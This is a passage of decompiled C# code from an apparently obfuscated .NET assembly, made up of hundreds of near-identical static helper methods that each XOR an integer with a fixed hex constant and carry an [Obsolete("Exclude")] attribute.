	public static int smethod_5735(int int_4)
	{
		return int_4 ^ 0x60777ED1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5736(int int_4)
	{
		return int_4 ^ 0x1FA52F48;
	}

	[Obsolete("Exclude")]
	public static int smethod_5737(int int_4)
	{
		return int_4 ^ 0x6BB89F98;
	}

	[Obsolete("Exclude")]
	public static int smethod_5738(int int_4)
	{
		return int_4 ^ 0x3D5604B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5739(int int_4)
	{
		return int_4 ^ 0x35C2AB86;
	}

	[Obsolete("Exclude")]
	public static int smethod_5740(int int_4)
	{
		return int_4 ^ 0xD7B4FED;
	}

	[Obsolete("Exclude")]
	public static int smethod_5741(int int_4)
	{
		return int_4 ^ 0x4C689C19;
	}

	[Obsolete("Exclude")]
	public static int smethod_5742(int int_4)
	{
		return int_4 ^ 0x138ECADC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5743(int int_4)
	{
		return int_4 ^ 0x3719FE67;
	}

	[Obsolete("Exclude")]
	public static int smethod_5744(int int_4)
	{
		return int_4 ^ 0x382107E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5745(int int_4)
	{
		return int_4 ^ 0x2EE4374E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5746(int int_4)
	{
		return int_4 ^ 0x48BE5FC1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5747(int int_4)
	{
		return int_4 ^ 0x569908F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5748(int int_4)
	{
		return int_4 ^ 0x5512E8E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5749(int int_4)
	{
		return int_4 ^ 0x1B732981;
	}

	[Obsolete("Exclude")]
	public static int smethod_5750(int int_4)
	{
		return int_4 ^ 0x49761CE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5751(int int_4)
	{
		return int_4 ^ 0x2E14123B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5752(int int_4)
	{
		return int_4 ^ 0x4C7B8A33;
	}

	[Obsolete("Exclude")]
	public static int smethod_5753(int int_4)
	{
		return int_4 ^ 0x6C1BC395;
	}

	[Obsolete("Exclude")]
	public static int smethod_5754(int int_4)
	{
		return int_4 ^ 0x605A5250;
	}

	[Obsolete("Exclude")]
	public static int smethod_5755(int int_4)
	{
		return int_4 ^ 0x51C311EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5756(int int_4)
	{
		return int_4 ^ 0x365DCC8E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5757(int int_4)
	{
		return int_4 ^ 0x4ED416B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5758(int int_4)
	{
		return int_4 ^ 0x4EAF7744;
	}

	[Obsolete("Exclude")]
	public static int smethod_5759(int int_4)
	{
		return int_4 ^ 0x77C512A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5760(int int_4)
	{
		return int_4 ^ 0x7C7C2C90;
	}

	[Obsolete("Exclude")]
	public static int smethod_5762(int int_4)
	{
		return int_4 ^ 0x612DD5D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5763(int int_4)
	{
		return int_4 ^ 0x28BEBF41;
	}

	[Obsolete("Exclude")]
	public static int smethod_5764(int int_4)
	{
		return int_4 ^ 0x4CE58173;
	}

	[Obsolete("Exclude")]
	public static int smethod_5765(int int_4)
	{
		return int_4 ^ 0x599993F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5766(int int_4)
	{
		return int_4 ^ 0x411B22C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5767(int int_4)
	{
		return int_4 ^ 0x51A88856;
	}

	[Obsolete("Exclude")]
	public static int smethod_5768(int int_4)
	{
		return int_4 ^ 0x653885B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5769(int int_4)
	{
		return int_4 ^ 0x296B8C37;
	}

	[Obsolete("Exclude")]
	public static int smethod_5770(int int_4)
	{
		return int_4 ^ 0x519EE200;
	}

	[Obsolete("Exclude")]
	public static int smethod_5771(int int_4)
	{
		return int_4 ^ 0x6CD460AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5772(int int_4)
	{
		return int_4 ^ 0x532377B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5773(int int_4)
	{
		return int_4 ^ 0x10BEDE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5774(int int_4)
	{
		return int_4 ^ 0xF2C51DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5775(int int_4)
	{
		return int_4 ^ 0x37F4E8CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5776(int int_4)
	{
		return int_4 ^ 0x6B029142;
	}

	[Obsolete("Exclude")]
	public static int smethod_5777(int int_4)
	{
		return int_4 ^ 0x5552F629;
	}

	[Obsolete("Exclude")]
	public static int smethod_5778(int int_4)
	{
		return int_4 ^ 0x430C7D53;
	}

	[Obsolete("Exclude")]
	public static int smethod_5779(int int_4)
	{
		return int_4 ^ 0x504BA05;
	}

	[Obsolete("Exclude")]
	public static int smethod_5780(int int_4)
	{
		return int_4 ^ 0x6899EADE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5781(int int_4)
	{
		return int_4 ^ 0x2E362414;
	}

	[Obsolete("Exclude")]
	public static int smethod_5783(int int_4)
	{
		return int_4 ^ 0x423CFD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5784(int int_4)
	{
		return int_4 ^ 0x65610F3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5785(int int_4)
	{
		return int_4 ^ 0x66A2763A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5786(int int_4)
	{
		return int_4 ^ 0x44027910;
	}

	[Obsolete("Exclude")]
	public static int smethod_5787(int int_4)
	{
		return int_4 ^ 0x15D41D02;
	}

	[Obsolete("Exclude")]
	public static int smethod_5788(int int_4)
	{
		return int_4 ^ 0x4024C9A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5790(int int_4)
	{
		return int_4 ^ 0x7995E2BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5791(int int_4)
	{
		return int_4 ^ 0x6D297618;
	}

	[Obsolete("Exclude")]
	public static int smethod_5792(int int_4)
	{
		return int_4 ^ 0x336753AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5793(int int_4)
	{
		return int_4 ^ 0x775809AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5794(int int_4)
	{
		return int_4 ^ 0x72CE696C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5795(int int_4)
	{
		return int_4 ^ 0x5C8993DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5796(int int_4)
	{
		return int_4 ^ 0x12E655A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5797(int int_4)
	{
		return int_4 ^ 0x6515A116;
	}

	[Obsolete("Exclude")]
	public static int smethod_5798(int int_4)
	{
		return int_4 ^ 0x7CE3A20E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5799(int int_4)
	{
		return int_4 ^ 0x59207F10;
	}

	[Obsolete("Exclude")]
	public static int smethod_5800(int int_4)
	{
		return int_4 ^ 0x2FA6ED06;
	}

	[Obsolete("Exclude")]
	public static int smethod_5801(int int_4)
	{
		return int_4 ^ 0x3D442BF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5802(int int_4)
	{
		return int_4 ^ 0x53C674AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5803(int int_4)
	{
		return int_4 ^ 0xBE71D68;
	}

	[Obsolete("Exclude")]
	public static int smethod_5804(int int_4)
	{
		return int_4 ^ 0x3EB51CEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5805(int int_4)
	{
		return int_4 ^ 0xF430607;
	}

	[Obsolete("Exclude")]
	public static int smethod_5806(int int_4)
	{
		return int_4 ^ 0x7295446;
	}

	[Obsolete("Exclude")]
	public static int smethod_5807(int int_4)
	{
		return int_4 ^ 0x34BF0E9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5808(int int_4)
	{
		return int_4 ^ 0x2D1342F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5809(int int_4)
	{
		return int_4 ^ 0x531194C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5810(int int_4)
	{
		return int_4 ^ 0x3EA29B20;
	}

	[Obsolete("Exclude")]
	public static int smethod_5811(int int_4)
	{
		return int_4 ^ 0x223A7BE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5812(int int_4)
	{
		return int_4 ^ 0x411912EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5813(int int_4)
	{
		return int_4 ^ 0x6B82F740;
	}

	[Obsolete("Exclude")]
	public static int smethod_5814(int int_4)
	{
		return int_4 ^ 0x4801BAB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5815(int int_4)
	{
		return int_4 ^ 0x244C324D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5816(int int_4)
	{
		return int_4 ^ 0xC9431A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5817(int int_4)
	{
		return int_4 ^ 0x23657CC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5818(int int_4)
	{
		return int_4 ^ 0x7964812C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5819(int int_4)
	{
		return int_4 ^ 0x851DB0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5820(int int_4)
	{
		return int_4 ^ 0x41196DD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5821(int int_4)
	{
		return int_4 ^ 0x5AC61C29;
	}

	[Obsolete("Exclude")]
	public static int smethod_5822(int int_4)
	{
		return int_4 ^ 0x3D3AA356;
	}

	[Obsolete("Exclude")]
	public static int smethod_5824(int int_4)
	{
		return int_4 ^ 0x76A408C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5825(int int_4)
	{
		return int_4 ^ 0x3639220E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5826(int int_4)
	{
		return int_4 ^ 0x2D8544AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5827(int int_4)
	{
		return int_4 ^ 0x15AAA91;
	}

	[Obsolete("Exclude")]
	public static int smethod_5828(int int_4)
	{
		return int_4 ^ 0x22FA9AA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5829(int int_4)
	{
		return int_4 ^ 0x5F7AF616;
	}

	[Obsolete("Exclude")]
	public static int smethod_5830(int int_4)
	{
		return int_4 ^ 0x45461D5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5831(int int_4)
	{
		return int_4 ^ 0x5476B693;
	}

	[Obsolete("Exclude")]
	public static int smethod_5832(int int_4)
	{
		return int_4 ^ 0x6D630DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5833(int int_4)
	{
		return int_4 ^ 0x7A246E25;
	}

	[Obsolete("Exclude")]
	public static int smethod_5834(int int_4)
	{
		return int_4 ^ 0x6553D610;
	}

	[Obsolete("Exclude")]
	public static int smethod_5835(int int_4)
	{
		return int_4 ^ 0x698CD161;
	}

	[Obsolete("Exclude")]
	public static int smethod_5836(int int_4)
	{
		return int_4 ^ 0x2FEE6CAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5837(int int_4)
	{
		return int_4 ^ 0x219516D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5838(int int_4)
	{
		return int_4 ^ 0x7B62454E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5839(int int_4)
	{
		return int_4 ^ 0x799870A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5840(int int_4)
	{
		return int_4 ^ 0x328CBAC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5841(int int_4)
	{
		return int_4 ^ 0x4B4CBB12;
	}

	[Obsolete("Exclude")]
	public static int smethod_5842(int int_4)
	{
		return int_4 ^ 0x1DB24CB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5843(int int_4)
	{
		return int_4 ^ 0x41CC7EC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5844(int int_4)
	{
		return int_4 ^ 0x6E8152D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5845(int int_4)
	{
		return int_4 ^ 0x6FBB034B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5846(int int_4)
	{
		return int_4 ^ 0xA97212B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5847(int int_4)
	{
		return int_4 ^ 0x1F57BA81;
	}

	[Obsolete("Exclude")]
	public static int smethod_5848(int int_4)
	{
		return int_4 ^ 0xC9B5997;
	}

	[Obsolete("Exclude")]
	public static int smethod_5849(int int_4)
	{
		return int_4 ^ 0x59DFE4FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5850(int int_4)
	{
		return int_4 ^ 0x7AB9D404;
	}

	[Obsolete("Exclude")]
	public static int smethod_5851(int int_4)
	{
		return int_4 ^ 0x7DE913FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5852(int int_4)
	{
		return int_4 ^ 0x1185C3D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5853(int int_4)
	{
		return int_4 ^ 0x2656BEB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5854(int int_4)
	{
		return int_4 ^ 0x791B5C53;
	}

	[Obsolete("Exclude")]
	public static int smethod_5855(int int_4)
	{
		return int_4 ^ 0x6FAC2A5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5856(int int_4)
	{
		return int_4 ^ 0xE1D3DFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5858(int int_4)
	{
		return int_4 ^ 0x1ADFD882;
	}

	[Obsolete("Exclude")]
	public static int smethod_5859(int int_4)
	{
		return int_4 ^ 0x418CD2D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5860(int int_4)
	{
		return int_4 ^ 0x8D70AA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5861(int int_4)
	{
		return int_4 ^ 0x46A02E92;
	}

	[Obsolete("Exclude")]
	public static int smethod_5863(int int_4)
	{
		return int_4 ^ 0x3FFE7618;
	}

	[Obsolete("Exclude")]
	public static int smethod_5864(int int_4)
	{
		return int_4 ^ 0x778F9705;
	}

	[Obsolete("Exclude")]
	public static int smethod_5865(int int_4)
	{
		return int_4 ^ 0x7FE4215D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5866(int int_4)
	{
		return int_4 ^ 0x5B6312D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5867(int int_4)
	{
		return int_4 ^ 0x33D66FB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5868(int int_4)
	{
		return int_4 ^ 0x717C1C4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5869(int int_4)
	{
		return int_4 ^ 0x2A2ABD36;
	}

	[Obsolete("Exclude")]
	public static int smethod_5870(int int_4)
	{
		return int_4 ^ 0x14D93C93;
	}

	[Obsolete("Exclude")]
	public static int smethod_5871(int int_4)
	{
		return int_4 ^ 0x7F171030;
	}

	[Obsolete("Exclude")]
	public static int smethod_5872(int int_4)
	{
		return int_4 ^ 0x7FD08A5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5873(int int_4)
	{
		return int_4 ^ 0x12185E6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5874(int int_4)
	{
		return int_4 ^ 0x434D4BA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5875(int int_4)
	{
		return int_4 ^ 0x78A0010;
	}

	[Obsolete("Exclude")]
	public static int smethod_5876(int int_4)
	{
		return int_4 ^ 0x2295C5B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5877(int int_4)
	{
		return int_4 ^ 0x6D7E5DB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5878(int int_4)
	{
		return int_4 ^ 0x75708E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5879(int int_4)
	{
		return int_4 ^ 0x62525F32;
	}

	[Obsolete("Exclude")]
	public static int smethod_5880(int int_4)
	{
		return int_4 ^ 0x422AF921;
	}

	[Obsolete("Exclude")]
	public static int smethod_5881(int int_4)
	{
		return int_4 ^ 0x910E17E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5882(int int_4)
	{
		return int_4 ^ 0x45FADE76;
	}

	[Obsolete("Exclude")]
	public static int smethod_5883(int int_4)
	{
		return int_4 ^ 0x4A13E6E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5884(int int_4)
	{
		return int_4 ^ 0x17426EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5885(int int_4)
	{
		return int_4 ^ 0x770762D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5886(int int_4)
	{
		return int_4 ^ 0x6297B391;
	}

	[Obsolete("Exclude")]
	public static int smethod_5887(int int_4)
	{
		return int_4 ^ 0x72C66DEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5888(int int_4)
	{
		return int_4 ^ 0x3FB7E08C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5889(int int_4)
	{
		return int_4 ^ 0x634E1B99;
	}

	[Obsolete("Exclude")]
	public static int smethod_5890(int int_4)
	{
		return int_4 ^ 0x2936EF6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5891(int int_4)
	{
		return int_4 ^ 0x61E4E457;
	}

	[Obsolete("Exclude")]
	public static int smethod_5892(int int_4)
	{
		return int_4 ^ 0x7D459366;
	}

	[Obsolete("Exclude")]
	public static int smethod_5893(int int_4)
	{
		return int_4 ^ 0x74E78761;
	}

	[Obsolete("Exclude")]
	public static int smethod_5894(int int_4)
	{
		return int_4 ^ 0x646A919A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5895(int int_4)
	{
		return int_4 ^ 0x6F75D3BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5896(int int_4)
	{
		return int_4 ^ 0x5C5857C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5897(int int_4)
	{
		return int_4 ^ 0x5291B47F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5898(int int_4)
	{
		return int_4 ^ 0x1526FBA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5899(int int_4)
	{
		return int_4 ^ 0x3B926ED9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5900(int int_4)
	{
		return int_4 ^ 0x1DE04825;
	}

	[Obsolete("Exclude")]
	public static int smethod_5901(int int_4)
	{
		return int_4 ^ 0x67E2D9BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5902(int int_4)
	{
		return int_4 ^ 0x1809A3F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5903(int int_4)
	{
		return int_4 ^ 0xDE7BB30;
	}

	[Obsolete("Exclude")]
	public static int smethod_5904(int int_4)
	{
		return int_4 ^ 0x77D3267D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5905(int int_4)
	{
		return int_4 ^ 0x6413B0F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5906(int int_4)
	{
		return int_4 ^ 0x4BCE5BD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5907(int int_4)
	{
		return int_4 ^ 0x5A2A86AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_5908(int int_4)
	{
		return int_4 ^ 0x425E76C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5909(int int_4)
	{
		return int_4 ^ 0x43BB30C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5910(int int_4)
	{
		return int_4 ^ 0x23B409EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5911(int int_4)
	{
		return int_4 ^ 0x4FA2A67C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5912(int int_4)
	{
		return int_4 ^ 0x21FCB40D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5913(int int_4)
	{
		return int_4 ^ 0x2441ED9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5914(int int_4)
	{
		return int_4 ^ 0x569FDBE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5915(int int_4)
	{
		return int_4 ^ 0xB5B7109;
	}

	[Obsolete("Exclude")]
	public static int smethod_5916(int int_4)
	{
		return int_4 ^ 0x66DB871C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5917(int int_4)
	{
		return int_4 ^ 0x2F7B2495;
	}

	[Obsolete("Exclude")]
	public static int smethod_5918(int int_4)
	{
		return int_4 ^ 0x764CD9E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5919(int int_4)
	{
		return int_4 ^ 0x1E0ECBEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5921(int int_4)
	{
		return int_4 ^ 0x5E8824AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5922(int int_4)
	{
		return int_4 ^ 0x1E172A1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5923(int int_4)
	{
		return int_4 ^ 0x201DC155;
	}

	[Obsolete("Exclude")]
	public static int smethod_5924(int int_4)
	{
		return int_4 ^ 0x949A6E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5925(int int_4)
	{
		return int_4 ^ 0x13F26854;
	}

	[Obsolete("Exclude")]
	public static int smethod_5926(int int_4)
	{
		return int_4 ^ 0x70B59358;
	}

	[Obsolete("Exclude")]
	public static int smethod_5927(int int_4)
	{
		return int_4 ^ 0x44925437;
	}

	[Obsolete("Exclude")]
	public static int smethod_5928(int int_4)
	{
		return int_4 ^ 0x1DD393E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5929(int int_4)
	{
		return int_4 ^ 0x2307E47A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5930(int int_4)
	{
		return int_4 ^ 0x10C52F65;
	}

	[Obsolete("Exclude")]
	public static int smethod_5931(int int_4)
	{
		return int_4 ^ 0x72559A59;
	}

	[Obsolete("Exclude")]
	public static int smethod_5932(int int_4)
	{
		return int_4 ^ 0x992105F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5933(int int_4)
	{
		return int_4 ^ 0x5AFFE3E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5934(int int_4)
	{
		return int_4 ^ 0x22ECC47D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5935(int int_4)
	{
		return int_4 ^ 0xF9C57A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_5936(int int_4)
	{
		return int_4 ^ 0x35D3BD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_5937(int int_4)
	{
		return int_4 ^ 0x6387A783;
	}

	[Obsolete("Exclude")]
	public static int smethod_5938(int int_4)
	{
		return int_4 ^ 0x4F2163C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5939(int int_4)
	{
		return int_4 ^ 0x6DA201B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_5940(int int_4)
	{
		return int_4 ^ 0x19CA17B;
	}

	[Obsolete("Exclude")]
	public static int smethod_5941(int int_4)
	{
		return int_4 ^ 0x25868881;
	}

	[Obsolete("Exclude")]
	public static int smethod_5942(int int_4)
	{
		return int_4 ^ 0x58782EC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_5943(int int_4)
	{
		return int_4 ^ 0x464725BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_5944(int int_4)
	{
		return int_4 ^ 0x3414F500;
	}

	[Obsolete("Exclude")]
	public static int smethod_5945(int int_4)
	{
		return int_4 ^ 0x12DF62C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_5946(int int_4)
	{
		return int_4 ^ 0x423D5163;
	}

	[Obsolete("Exclude")]
	public static int smethod_5948(int int_4)
	{
		return int_4 ^ 0x5D1FEB67;
	}

	[Obsolete("Exclude")]
	public static int smethod_5949(int int_4)
	{
		return int_4 ^ 0x3462D708;
	}

	[Obsolete("Exclude")]
	public static int smethod_5950(int int_4)
	{
		return int_4 ^ 0x29B03D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5951(int int_4)
	{
		return int_4 ^ 0x5F686A4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_5952(int int_4)
	{
		return int_4 ^ 0x23243EE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5953(int int_4)
	{
		return int_4 ^ 0x35087EA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5954(int int_4)
	{
		return int_4 ^ 0x509C90EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_5955(int int_4)
	{
		return int_4 ^ 0x2F96C8C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5956(int int_4)
	{
		return int_4 ^ 0x3E5A47AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5957(int int_4)
	{
		return int_4 ^ 0x4F0182E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_5958(int int_4)
	{
		return int_4 ^ 0x648998EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_5959(int int_4)
	{
		return int_4 ^ 0x5446C6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5960(int int_4)
	{
		return int_4 ^ 0x2EFB6953;
	}

	[Obsolete("Exclude")]
	public static int smethod_5961(int int_4)
	{
		return int_4 ^ 0x4CBE3FAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5962(int int_4)
	{
		return int_4 ^ 0x74FC4FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5963(int int_4)
	{
		return int_4 ^ 0x7213477A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5964(int int_4)
	{
		return int_4 ^ 0x198AAE70;
	}

	[Obsolete("Exclude")]
	public static int smethod_5965(int int_4)
	{
		return int_4 ^ 0x4F66C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5966(int int_4)
	{
		return int_4 ^ 0x2F126617;
	}

	[Obsolete("Exclude")]
	public static int smethod_5967(int int_4)
	{
		return int_4 ^ 0x33A50A64;
	}

	[Obsolete("Exclude")]
	public static int smethod_5969(int int_4)
	{
		return int_4 ^ 0x388DA8D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_5970(int int_4)
	{
		return int_4 ^ 0x7A5E9EDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5971(int int_4)
	{
		return int_4 ^ 0x2157B068;
	}

	[Obsolete("Exclude")]
	public static int smethod_5972(int int_4)
	{
		return int_4 ^ 0x3BF412E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_5973(int int_4)
	{
		return int_4 ^ 0x65F69B52;
	}

	[Obsolete("Exclude")]
	public static int smethod_5974(int int_4)
	{
		return int_4 ^ 0x31CC8B01;
	}

	[Obsolete("Exclude")]
	public static int smethod_5975(int int_4)
	{
		return int_4 ^ 0x3ADEC8DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_5976(int int_4)
	{
		return int_4 ^ 0x7A20D05D;
	}

	[Obsolete("Exclude")]
	public static int smethod_5977(int int_4)
	{
		return int_4 ^ 0x3EAB2CED;
	}

	[Obsolete("Exclude")]
	public static int smethod_5978(int int_4)
	{
		return int_4 ^ 0x35288A36;
	}

	[Obsolete("Exclude")]
	public static int smethod_5979(int int_4)
	{
		return int_4 ^ 0x7C35B884;
	}

	[Obsolete("Exclude")]
	public static int smethod_5980(int int_4)
	{
		return int_4 ^ 0x4252B485;
	}

	[Obsolete("Exclude")]
	public static int smethod_5981(int int_4)
	{
		return int_4 ^ 0x6E7916C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_5982(int int_4)
	{
		return int_4 ^ 0x2013887E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5983(int int_4)
	{
		return int_4 ^ 0x466F4847;
	}

	[Obsolete("Exclude")]
	public static int smethod_5984(int int_4)
	{
		return int_4 ^ 0x48EB651A;
	}

	[Obsolete("Exclude")]
	public static int smethod_5986(int int_4)
	{
		return int_4 ^ 0x14956380;
	}

	[Obsolete("Exclude")]
	public static int smethod_5987(int int_4)
	{
		return int_4 ^ 0x5C15BD19;
	}

	[Obsolete("Exclude")]
	public static int smethod_5988(int int_4)
	{
		return int_4 ^ 0x294B35BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_5990(int int_4)
	{
		return int_4 ^ 0x28421277;
	}

	[Obsolete("Exclude")]
	public static int smethod_5991(int int_4)
	{
		return int_4 ^ 0x726D4347;
	}

	[Obsolete("Exclude")]
	public static int smethod_5992(int int_4)
	{
		return int_4 ^ 0x78327E28;
	}

	[Obsolete("Exclude")]
	public static int smethod_5993(int int_4)
	{
		return int_4 ^ 0x6E13A8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_5994(int int_4)
	{
		return int_4 ^ 0x3AE66678;
	}

	[Obsolete("Exclude")]
	public static int smethod_5996(int int_4)
	{
		return int_4 ^ 0x1F2631C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5997(int int_4)
	{
		return int_4 ^ 0x1CCC66D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_5998(int int_4)
	{
		return int_4 ^ 0x49D2A13E;
	}

	[Obsolete("Exclude")]
	public static int smethod_5999(int int_4)
	{
		return int_4 ^ 0x78E1AEE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6000(int int_4)
	{
		return int_4 ^ 0x3D3C6666;
	}

	[Obsolete("Exclude")]
	public static int smethod_6002(int int_4)
	{
		return int_4 ^ 0x53FC5A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6003(int int_4)
	{
		return int_4 ^ 0x4B85CF80;
	}

	[Obsolete("Exclude")]
	public static int smethod_6004(int int_4)
	{
		return int_4 ^ 0xDE48335;
	}

	[Obsolete("Exclude")]
	public static int smethod_6005(int int_4)
	{
		return int_4 ^ 0x925B0C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6006(int int_4)
	{
		return int_4 ^ 0x7860BBD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6007(int int_4)
	{
		return int_4 ^ 0x7783ABC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6008(int int_4)
	{
		return int_4 ^ 0x413B1DEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6009(int int_4)
	{
